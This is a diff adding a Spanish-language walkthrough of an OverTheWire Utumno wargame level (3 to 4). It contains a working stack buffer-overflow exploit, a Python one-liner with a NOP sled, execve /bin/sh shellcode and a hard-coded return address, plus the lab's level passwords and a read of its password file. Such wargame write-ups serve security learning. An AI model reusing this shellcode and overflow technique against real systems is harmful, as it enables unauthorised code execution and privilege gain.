@@ -72,3 +72,14 @@ creamos una variable donde estara la shellcode y encontrasmos la dirreccion adec
 oogieleoga
 LA CONTRASEÑA QUE ENCONTRAMOS ES:: oogieleoga
 
+LEVEL 3->4
+Ingresamos con ssh utumno4@utumno.labs.overthewire.org -p 2227
+Contraseña: oogieleoga
+nos dio varios numeros como en el anterior level , carganmos una shellcode y buscanos una dirreccion de retorno usamos 0xfffed660 y nos da
+utumno4@utumno:/utumno$ ./utumno4 65536 $(python -c "print '\x90' * 65257 + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 8 * '\x90' + '\x60\xd6\xfe\xff' + 'C' * 246")
+$ whoami
+utumno5
+$ cat /etc/utumno_pass/utumno5
+woucaejiek
+La contraseña es woucaejiek
+
